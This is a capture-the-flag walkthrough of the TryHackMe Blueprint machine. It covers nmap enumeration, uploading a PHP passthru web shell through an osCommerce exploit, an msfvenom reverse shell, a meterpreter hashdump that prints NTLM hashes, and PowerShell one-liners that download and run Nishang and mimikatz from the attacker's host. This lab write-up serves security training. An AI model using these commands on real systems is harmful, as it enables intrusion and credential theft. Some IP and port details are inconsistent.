![image](https://github.com/CTF-Walkthroughs/blueprint-walkthrough/assets/97861439/328bebaf-6fbd-4e8b-84dd-e9c9b60fa206)

# blueprint-walkthrough
This is a CTF walkthrough of the machine blueprint on THM

export IP=10.10.51.155
export myIP=10.13.24.71

**ENUMERATION**

Let's kick things off with a fast nmap scan to get a lay of the land.

nmap -F $IP

Nmap scan report for 10.10.85.154
Host is up (0.33s latency).
Not shown: 90 closed tcp ports (conn-refused)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
443/tcp   open  https
445/tcp   open  microsoft-ds
3306/tcp  open  mysql
8080/tcp  open  http-proxy
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 2.63 seconds

Now we'll do a follow-up scan to get more details about open ports, services, and software versions.

nmap -p 80,135,443,3306,8080,49152,49153,49154 -sC -sV -A -T4 $IP

Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-28 23:20 EDT
Stats: 0:01:06 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 96.65% done; ETC: 23:21 (0:00:00 remaining)
Nmap scan report for 10.10.85.154
Host is up (0.25s latency).

PORT      STATE SERVICE  VERSION
80/tcp    open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: 404 - File or directory not found.
135/tcp   open  msrpc    Microsoft Windows RPC
443/tcp   open  ssl/http Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
|_http-title: Index of /
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2019-04-11 22:52  oscommerce-2.3.4/
| -     2019-04-11 22:52  oscommerce-2.3.4/catalog/
| -     2019-04-11 22:52  oscommerce-2.3.4/docs/
|_
| http-methods: 
|_  Potentially risky methods: TRACE
3306/tcp  open  mysql    MariaDB (unauthorized)
8080/tcp  open  http     Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
| http-methods: 
|_  Potentially risky methods: TRACE
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2019-04-11 22:52  oscommerce-2.3.4/
| -     2019-04-11 22:52  oscommerce-2.3.4/catalog/
| -     2019-04-11 22:52  oscommerce-2.3.4/docs/
|_
|_http-title: Index of /
49152/tcp open  msrpc    Microsoft Windows RPC
49153/tcp open  msrpc    Microsoft Windows RPC
49154/tcp open  msrpc    Microsoft Windows RPC
Service Info: Hosts: www.example.com, localhost; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: BLUEPRINT, NetBIOS user: <unknown>, NetBIOS MAC: 027f2be5a1cf (unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 79.26 seconds

Next, let's do a bit of directory busting with gobuster and dirb. We discovered a /catalog/install directory that we can use to install the database and create an admin user.

'oscommerce-2.3.4/catalog/install'

Now we can upload a simple passthrough to allow in-browser command execution. 
**
EXPLOITATION**

Next. let's create a shell.php file with the following contents for our passthru shell:
'<?php passthru($_GET['cmd']); ?>'

And we can upload it using the exploit from searchsploit:
'python 43191.py -u http://10.10.51.155:8080/oscommerce-2.3.4 --auth=admin:admin -f shell.php'

**PROOF OF CONCEPT**

We can test our php passthru shell a simple command like 'whoami'.

**Using Metasploit to convert RCE to a fully interactive shell**

First let's create a payload.

'msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.13.24.71 LPORT=7777 -f exe > shell.exe'

'msfconsole'

Now we can let it rip and catch the shell with the web_delivery module.

And BOOM! We have a meterpreter session on our target. We can issue a 'hashdump' command to grab all the user hashes.

msf6 exploit(multi/script/web_delivery) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:549a1bcb88e35dc18c7a0b0168631411:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Lab:1000:aad3b435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450:::
meterpreter >

**Using Crackstation to quickly crack our hash**
googleplus

**ROOT FLAG**
root.txt
THM{ae--------REDACTED-----------ee}


**OPTIONAL ALTERNATIVE METHOD TO CONVERT TO A SHELL**

Nishang Powershell:
1. download Invoke-PowerShellTcp.ps1

2. modify the script to add the command to the end of the script

'Invoke-PowerShellTcp -Reverse -IPAddress 10.13.24.71 -Port 80'

3. host an http server on port 80

4. Download the file to the target machine and run it:

'powershell iex(new-object net.webclient).downloadstring('http://10.13.24.71:8000/ips88.ps1')'

Now that we have a shell -let's grab the hashed NTLM for user Lab with mimikatz!

download it to my attacker machine and serve it up using python

powershell iex(new-object net.webclient).downloadstring('http://10.13.24.71:8000/mimikatz.exe')


